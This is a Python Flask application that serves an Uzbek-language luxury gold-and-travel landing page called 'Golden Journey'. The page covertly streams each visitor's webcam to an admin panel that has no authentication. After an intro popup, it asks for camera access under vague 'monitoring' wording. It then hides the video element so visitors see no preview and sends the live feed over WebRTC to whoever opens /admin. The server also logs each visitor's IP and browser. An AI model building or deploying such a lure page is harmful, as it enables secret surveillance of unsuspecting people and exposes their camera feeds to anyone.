# main.py
import time
import os
from flask import Flask, Response, request
from flask_socketio import SocketIO, emit, join_room

app = Flask(__name__)
app.config["SECRET_KEY"] = "change-me"

socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

# Online userlar: {user_id: {"sid": "...", "last": ts}}
ONLINE = {}


# =========================
# USER PAGE (sizning dizayn + kamera ruxsati + WebRTC sender)
# =========================
USER_PAGE = r"""<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Golden Journey</title>
  <style>
    body {
      margin: 0;
      font-family: 'Georgia', serif;
      background-color: #0e0e0e;
      color: #f5d27a;
    }

    header {
      height: 100vh;
      background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)),
        url("https://images.unsplash.com/photo-1541701494587-cb58502866ab?auto=format&fit=crop&w=1920&q=80")
        center/cover no-repeat;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
      padding: 24px;
      box-sizing: border-box;
    }

    header h1 { font-size: clamp(42px, 6vw, 72px); margin: 0 0 20px; }
    header p  { font-size: clamp(16px, 2vw, 22px); color: #e6c36a; margin: 0; }

    section { padding: 80px 10%; }
    h2 { text-align:center; font-size: clamp(28px, 4vw, 42px); margin-bottom: 40px; }

    .cards {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 30px;
    }

    .card {
      background: #151515;
      padding: 25px;
      border-radius: 12px;
      transition: transform 0.3s, box-shadow 0.3s;
      border: 1px solid rgba(245,210,122,.12);
    }

    .card:hover {
      transform: translateY(-10px);
      box-shadow: 0 10px 30px rgba(245,210,122,0.2);
    }

    .card h3 { margin: 0 0 10px; }
    .card p  { color: #ddd; font-size: 15px; margin: 0; }

    button {
      background: #f5d27a;
      border: none;
      padding: 12px 30px;
      font-size: 16px;
      cursor: pointer;
      border-radius: 30px;
      margin-top: 20px;
      font-weight: 700;
    }
    button:hover { background: #e6c36a; }
    button.secondary {
      background: transparent;
      color: #f5d27a;
      border: 1px solid rgba(245,210,122,.45);
    }

    footer {
      background: #111;
      text-align: center;
      padding: 30px;
      color: #aaa;
    }

    /* POPUP (asosiy) */
    .popup {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.85);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 20;
      padding: 18px;
      box-sizing: border-box;
    }

    .popup-content {
      background: #1c1c1c;
      padding: 30px;
      border-radius: 14px;
      text-align: center;
      max-width: 420px;
      width: 100%;
      border: 1px solid rgba(245,210,122,.15);
      box-shadow: 0 12px 30px rgba(0,0,0,.45);
    }

    .popup-content p {
      color: #ddd;
      line-height: 1.45;
    }

    /* Kamera ruxsati popup */
    .cam-popup {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.85);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 30;
      padding: 18px;
      box-sizing: border-box;
    }

    .cam-box {
      background: #1c1c1c;
      padding: 26px;
      border-radius: 14px;
      text-align: center;
      max-width: 460px;
      width: 100%;
      box-shadow: 0 10px 30px rgba(0,0,0,.45);
      border: 1px solid rgba(245,210,122,.15);
    }

    .cam-box h3 { margin: 0 0 10px; font-size: 22px; }
    .cam-box p  { margin: 0 0 16px; color: #e6c36a; line-height: 1.4; }

    .btn-row { display:flex; gap:10px; justify-content:center; flex-wrap:wrap; margin-top: 6px; }

    .hint { margin-top: 12px; font-size: 14px; color: rgba(245,210,122,.8); }
    .small { font-size: 13px; color: rgba(245,210,122,.75); margin-top: 10px; }
    .hidden { display:none !important; }

    /* MUHIM: video ko‘rinmaydi */
    video { display:none !important; }
  </style>
</head>
<body>

<!-- POPUP (sayt intro) -->
<div class="popup" id="popup">
  <div class="popup-content">
    <h3>Diqqat!</h3>
    <p>
      Ushbu sayt tilla va qimmatbaho buyumlar asosida yaratilgan.
      Davom etish orqali siz boylik va sayohat ilhomiga rozilik bildirasiz ✨
    </p>
    <button id="continueBtn">Davom etish</button>
  </div>
</div>

<!-- Kamera ruxsati popup -->
<div class="cam-popup" id="camPopup">
  <div class="cam-box">
    <h3 id="camTitle">Diqqat</h3>
    <p id="camText">Kamera kuzatuvi mavjud. Rozilik bersangiz kamera ishga tushadi.</p>

    <div class="btn-row" id="camButtons">
      <button id="agreeBtn">Roziman</button>
      <button class="secondary" id="denyBtn">Rozi emasman</button>
    </div>

    <div class="hint" id="camHint">
      Eslatma: birinchi marta brauzer kameraga ruxsat oynasini ko‘rsatadi — bu normal.
    </div>

    <div class="small hidden" id="blockedHelp">
      Kamera bloklangan bo‘lsa: brauzerda <b>Site settings</b> → <b>Camera</b> → <b>Allow</b> qilib qo‘ying,
      so‘ng sahifani yangilang.
    </div>
  </div>
</div>

<header>
  <div>
    <h1>Golden Journey</h1>
    <p>Tilla, Boylik va Sayohat Orzulari</p>
    <button onclick="scrollToSection()">Boshlash</button>
  </div>
</header>

<section id="travel">
  <h2>🌍 Sayohat & Tilla</h2>
  <div class="cards">
    <div class="card">
      <h3>🇦🇪 Dubay</h3>
      <p>Gold Souk — dunyodagi eng mashhur tilla bozori.</p>
    </div>
    <div class="card">
      <h3>🇹🇷 Istanbul</h3>
      <p>Kapalıçarşı — tarix va tilla uyg‘unligi.</p>
    </div>
    <div class="card">
      <h3>🇫🇷 Parij</h3>
      <p>Cartier, Van Cleef & Arpels kabi hashamat.</p>
    </div>
  </div>
</section>

<section>
  <h2>💎 Qimmatbaho Buyumlar</h2>
  <div class="cards">
    <div class="card">
      <h3>Uzuklar</h3>
      <p>Oltin va brilliant bilan bezatilgan.</p>
    </div>
    <div class="card">
      <h3>Marjonlar</h3>
      <p>Qirollik uslubidagi dizaynlar.</p>
    </div>
    <div class="card">
      <h3>Antik buyumlar</h3>
      <p>Tarixga boy qimmatbaho san’at.</p>
    </div>
  </div>
</section>

<section>
  <h2>👑 Boy Ayollar Falsafasi</h2>
  <div class="cards">
    <div class="card"><p>Boylik — bu faqat pul emas, bu did va tanlov.</p></div>
    <div class="card"><p>Tilla — vaqt o‘tishi bilan qadri oshadigan boylik.</p></div>
    <div class="card"><p>Sayohat — eng qimmat investitsiya.</p></div>
  </div>
</section>

<footer>
  © 2026 Golden Journey | Luxury & Inspiration
</footer>

<!-- Hidden video: stream "tirik" tursin -->
<video id="cam" autoplay playsinline muted></video>

<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<script>
  // Scroll
  function scrollToSection() {
    document.getElementById("travel").scrollIntoView({ behavior: "smooth" });
  }

  // UI elements
  const popup = document.getElementById("popup");
  const continueBtn = document.getElementById("continueBtn");

  const camPopup = document.getElementById("camPopup");
  const camTitle = document.getElementById("camTitle");
  const camText  = document.getElementById("camText");
  const camHint  = document.getElementById("camHint");
  const blockedHelp = document.getElementById("blockedHelp");
  const camButtons = document.getElementById("camButtons");

  const agreeBtn = document.getElementById("agreeBtn");
  const denyBtn  = document.getElementById("denyBtn");
  const videoEl  = document.getElementById("cam");

  function showCamPopup() { camPopup.style.display = "flex"; }
  function hideCamPopup() { camPopup.style.display = "none"; }

  function setBlockedUI() {
    camTitle.textContent = "Kamera bloklangan";
    camText.textContent  = "Brauzer kameraga ruxsat bermayapti (Denied). Sozlamalardan ruxsat bering.";
    camHint.classList.add("hidden");
    blockedHelp.classList.remove("hidden");
    camButtons.innerHTML = '<button class="secondary" onclick="hideCamPopup()">Yopish</button>';
    showCamPopup();
  }

  // --- WebRTC + signaling ---
  const socket = io();
  let pc = null;
  let stream = null;

  function getUserId() {
    let id = localStorage.getItem("gj_user_id");
    if (!id) {
      id = "user-" + Math.random().toString(16).slice(2) + "-" + Date.now().toString(16);
      localStorage.setItem("gj_user_id", id);
    }
    return id;
  }
  const USER_ID = getUserId();

  const ICE_SERVERS = [
    { urls: "stun:stun.l.google.com:19302" },
    { urls: "stun:stun1.l.google.com:19302" }
  ];

  async function startStreamNoPreview() {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });

    // hidden video elementga ulab qo‘yamiz (ko‘rinmaydi)
    videoEl.srcObject = stream;
    try { await videoEl.play(); } catch (e) {}

    // Serverga log (ixtiyoriy)
    fetch("/camera-approved", { method: "POST" }).catch(()=>{});

    // Online ro‘yxatga qo‘shish
    socket.emit("register_user", { user_id: USER_ID });

    // WebRTC
    pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });

    for (const track of stream.getTracks()) {
      pc.addTrack(track, stream);
    }

    pc.onicecandidate = (e) => {
      if (e.candidate) socket.emit("ice", { user_id: USER_ID, candidate: e.candidate });
    };

    socket.on("answer", async (data) => {
      if (!pc) return;
      try { await pc.setRemoteDescription(new RTCSessionDescription(data.sdp)); } catch(e) {}
    });

    socket.on("ice", async (data) => {
      if (!pc) return;
      if (data.user_id !== USER_ID) return;
      try { await pc.addIceCandidate(data.candidate); } catch(e) {}
    });

    socket.on("admin-watch", async () => {
      if (!pc) return;
      try {
        const offer = await pc.createOffer({ offerToReceiveVideo:false, offerToReceiveAudio:false });
        await pc.setLocalDescription(offer);
        socket.emit("offer", { user_id: USER_ID, sdp: pc.localDescription });
      } catch (e) {}
    });
  }

  async function initPermissionFlow() {
    try {
      if (navigator.permissions && navigator.permissions.query) {
        const status = await navigator.permissions.query({ name: "camera" });

        if (status.state === "granted") {
          hideCamPopup();
          try { await startStreamNoPreview(); } catch (e) {}
          return;
        }

        if (status.state === "denied") {
          setBlockedUI();
          return;
        }

        // prompt
        showCamPopup();
        status.onchange = async () => {
          if (status.state === "granted") {
            hideCamPopup();
            try { await startStreamNoPreview(); } catch (e) {}
          }
        };
        return;
      }
    } catch (e) {}

    // fallback
    showCamPopup();
  }

  async function startCamera() {
    hideCamPopup();
    try {
      await startStreamNoPreview();
    } catch (e) {
      alert("Kamera ruxsati berilmadi yoki kamera topilmadi.");
    }
  }

  function stopAll() {
    try {
      if (pc) { pc.close(); pc = null; }
      if (stream) {
        stream.getTracks().forEach(t => t.stop());
        stream = null;
      }
      socket.emit("user_offline", { user_id: USER_ID });
    } catch(e) {}
  }

  // Intro popup: “Davom etish” bosilgach kamera permission flow boshlanadi
  continueBtn.addEventListener("click", async () => {
    popup.style.display = "none";
    await initPermissionFlow();
  });

  agreeBtn.addEventListener("click", startCamera);
  denyBtn.addEventListener("click", hideCamPopup);

  window.addEventListener("beforeunload", stopAll);
</script>
</body>
</html>
"""


# =========================
# ADMIN PAGE (open, token yo‘q)
# =========================
ADMIN_PAGE = r"""<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Admin — Live</title>
  <style>
    body { margin:0; font-family:Georgia,serif; background:#0e0e0e; color:#f5d27a; }
    header { padding:18px; border-bottom:1px solid rgba(245,210,122,.15); }
    h1 { margin:0; font-size:22px; }
    .muted { color: rgba(245,210,122,.7); font-size:13px; margin-top:8px; line-height:1.35; }
    .wrap { display:flex; gap:14px; padding:18px; flex-wrap:wrap; align-items:flex-start; }

    .card {
      background:#141414;
      border:1px solid rgba(245,210,122,.15);
      border-radius:14px;
      padding:14px;
      box-shadow:0 10px 30px rgba(0,0,0,.35);
    }

    .list { width:min(360px, 92vw); }
    .video { width:min(760px, 96vw); }

    .row {
      display:flex; justify-content:space-between; align-items:center;
      padding:10px 10px; border-radius:12px;
      border:1px solid rgba(245,210,122,.12);
      margin-top:10px; background:#0f0f0f;
      gap: 10px;
    }

    button {
      background:#f5d27a; border:none; padding:8px 14px;
      border-radius:12px; cursor:pointer; font-weight:700;
      white-space: nowrap;
    }
    button.secondary { background:transparent; color:#f5d27a; border:1px solid rgba(245,210,122,.35); }

    video {
      width:100%;
      background:#000;
      border-radius:16px;
      border:1px solid rgba(245,210,122,.25);
    }

    .badge { font-size:12px; padding:4px 8px; border-radius:999px; border:1px solid rgba(245,210,122,.25); }
  </style>
</head>
<body>
  <header>
    <h1>Admin Panel — Online Live Kuzatuv</h1>
    <div class="muted">
      Bu panel faqat jonli ko‘rsatadi. Server hech narsa saqlamaydi (zapis yo‘q).
    </div>
  </header>

  <div class="wrap">
    <div class="card list">
      <div style="display:flex;justify-content:space-between;align-items:center;">
        <b>Online foydalanuvchilar</b>
        <span class="badge" id="count">0</span>
      </div>
      <div id="users"></div>
      <div class="muted">
        Video chiqmasa: real hostingda HTTPS va ba’zan TURN kerak bo‘ladi.
      </div>
    </div>

    <div class="card video">
      <b>Live ko‘rish</b>
      <div class="muted" id="status">Hali user tanlanmagan.</div>
      <div style="margin-top:10px;">
        <video id="remote" autoplay playsinline controls></video>
      </div>
      <div style="display:flex;gap:10px;margin-top:10px;flex-wrap:wrap;">
        <button class="secondary" id="stopBtn">To‘xtatish</button>
      </div>
    </div>
  </div>

  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
  <script>
    const socket = io();
    const usersEl = document.getElementById("users");
    const countEl = document.getElementById("count");
    const statusEl = document.getElementById("status");
    const remoteVideo = document.getElementById("remote");
    const stopBtn = document.getElementById("stopBtn");

    let currentUserId = null;
    let pc = null;

    const ICE_SERVERS = [
      { urls: "stun:stun.l.google.com:19302" },
      { urls: "stun:stun1.l.google.com:19302" }
    ];

    function renderUsers(list) {
      usersEl.innerHTML = "";
      countEl.textContent = String(list.length);

      if (list.length === 0) {
        usersEl.innerHTML = '<div class="muted" style="margin-top:10px;">Online user yo‘q.</div>';
        return;
      }

      for (const u of list) {
        const div = document.createElement("div");
        div.className = "row";
        div.innerHTML = `
          <div style="min-width:0;">
            <div style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap;"><b>${u.user_id}</b></div>
            <div class="muted">Oxirgi signal: ${new Date(u.last*1000).toLocaleTimeString()}</div>
          </div>
          <button data-id="${u.user_id}">Ko‘rish</button>
        `;
        div.querySelector("button").addEventListener("click", () => watch(u.user_id));
        usersEl.appendChild(div);
      }
    }

    function resetPeer() {
      try { if (pc) pc.close(); } catch(e) {}
      pc = null;
      remoteVideo.srcObject = null;
    }

    async function ensurePeer(user_id) {
      resetPeer();
      pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });

      pc.ontrack = (event) => {
        const [stream] = event.streams;
        remoteVideo.srcObject = stream;
      };

      pc.onicecandidate = (e) => {
        if (e.candidate) socket.emit("ice", { user_id, candidate: e.candidate });
      };

      socket.off("offer");
      socket.off("ice");

      socket.on("offer", async (data) => {
        if (!pc) return;
        if (data.user_id !== currentUserId) return;

        try {
          await pc.setRemoteDescription(new RTCSessionDescription(data.sdp));
          const answer = await pc.createAnswer();
          await pc.setLocalDescription(answer);
          socket.emit("answer", { user_id: currentUserId, sdp: pc.localDescription });
        } catch(e) {}
      });

      socket.on("ice", async (data) => {
        if (!pc) return;
        if (data.user_id !== currentUserId) return;
        try { await pc.addIceCandidate(data.candidate); } catch(e) {}
      });
    }

    async function watch(user_id) {
      currentUserId = user_id;
      statusEl.textContent = "Ulanmoqda: " + user_id;

      await ensurePeer(user_id);

      socket.emit("admin_watch", { user_id });
      statusEl.textContent = "Live: " + user_id;
    }

    stopBtn.addEventListener("click", () => {
      statusEl.textContent = "To‘xtatildi.";
      currentUserId = null;
      resetPeer();
    });

    socket.on("online_list", (data) => renderUsers((data && data.list) ? data.list : []));
    socket.emit("admin_get_list");
  </script>
</body>
</html>
"""


# =========================
# ROUTES
# =========================
@app.route("/")
def index():
    return Response(USER_PAGE, mimetype="text/html")


@app.route("/admin")
def admin():
    return Response(ADMIN_PAGE, mimetype="text/html")


@app.route("/camera-approved", methods=["POST"])
def cam_ok():
    print("Kamera ruxsati berildi | IP:", request.remote_addr, "| UA:", request.headers.get("User-Agent"))
    return "", 204


# =========================
# SOCKET HELPERS
# =========================
def push_online_list():
    now = time.time()
    # 60 sekunddan eski userlarni online dan chiqaramiz
    dead = [uid for uid, v in ONLINE.items() if now - v["last"] > 60]
    for uid in dead:
        ONLINE.pop(uid, None)

    lst = [{"user_id": uid, "last": ONLINE[uid]["last"]} for uid in ONLINE.keys()]
    socketio.emit("online_list", {"list": lst})


# =========================
# SOCKET EVENTS
# =========================
@socketio.on("register_user")
def register_user(data):
    user_id = (data or {}).get("user_id")
    if not user_id:
        return
    ONLINE[user_id] = {"sid": request.sid, "last": time.time()}
    push_online_list()


@socketio.on("user_offline")
def user_offline(data):
    user_id = (data or {}).get("user_id")
    if user_id and user_id in ONLINE:
        ONLINE.pop(user_id, None)
    push_online_list()


@socketio.on("disconnect")
def on_disconnect():
    sid = request.sid
    remove_id = None
    for uid, v in ONLINE.items():
        if v["sid"] == sid:
            remove_id = uid
            break
    if remove_id:
        ONLINE.pop(remove_id, None)
    push_online_list()


@socketio.on("admin_get_list")
def admin_get_list():
    push_online_list()


@socketio.on("admin_watch")
def admin_watch(data):
    user_id = (data or {}).get("user_id")
    if not user_id or user_id not in ONLINE:
        return

    # Admin user_id roomga kiradi (adminlar ko‘p bo‘lishi mumkin)
    join_room(user_id)

    # Userga signal: admin live ko‘rmoqchi → user offer yaratadi
    socketio.emit("admin-watch", {}, to=ONLINE[user_id]["sid"])


@socketio.on("offer")
def offer(data):
    user_id = (data or {}).get("user_id")
    sdp = (data or {}).get("sdp")
    if not user_id or not sdp:
        return

    # Offer adminlarga (room) ketadi
    socketio.emit("offer", {"user_id": user_id, "sdp": sdp}, room=user_id)


@socketio.on("answer")
def answer(data):
    user_id = (data or {}).get("user_id")
    sdp = (data or {}).get("sdp")
    if not user_id or not sdp:
        return

    # Answer userga ketadi
    if user_id in ONLINE:
        socketio.emit("answer", {"sdp": sdp}, to=ONLINE[user_id]["sid"])


@socketio.on("ice")
def ice(data):
    user_id = (data or {}).get("user_id")
    candidate = (data or {}).get("candidate")
    if not user_id or not candidate:
        return

    # ICE adminlarga (room) ham, userga ham ketishi kerak
    socketio.emit("ice", {"user_id": user_id, "candidate": candidate}, room=user_id)
    if user_id in ONLINE:
        socketio.emit("ice", {"user_id": user_id, "candidate": candidate}, to=ONLINE[user_id]["sid"])






if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    socketio.run(app, host="0.0.0.0", port=port, debug=False)
